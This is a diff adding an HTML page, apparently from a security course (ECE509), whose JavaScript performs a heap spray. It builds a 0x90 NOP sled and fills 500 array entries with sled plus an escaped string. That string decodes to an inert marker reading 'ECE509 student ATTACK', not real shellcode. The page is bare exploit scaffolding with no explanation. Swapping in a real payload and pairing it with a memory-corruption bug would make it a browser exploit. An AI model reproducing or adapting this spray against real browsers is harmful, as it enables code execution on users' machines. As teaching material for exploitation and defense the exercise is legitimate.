@@ -1,0 +1,25 @@
+<html>
+<body>
+<script language='javascript'>
+
+    var sCode = unescape('%u4345%u3545%u3930%u7320%u7574%u6564%u7464%u4120%u5454%u4341%u0a4b'
+    ); // ECE509 student ATTACK
+
+    var noOP = unescape('%u9090%u9090');
+
+    var header = 20;
+    var extra = header + sCode.length;
+
+    while (noOP.length < extra) noOP += noOP;
+    var fill = noOP.substring(0,extra);
+    var section = noOP.substring(0,noOP.length - extra);
+
+    while (section.length + extra < 0x40000) section = section + section + fill;
+    var memory = new Array();
+    for (i = 0; i < 500; i++){ memory[i] = section + sCode }
+
+    alert("Allocated to memory");
+
+</script>
+</body>
+</html>
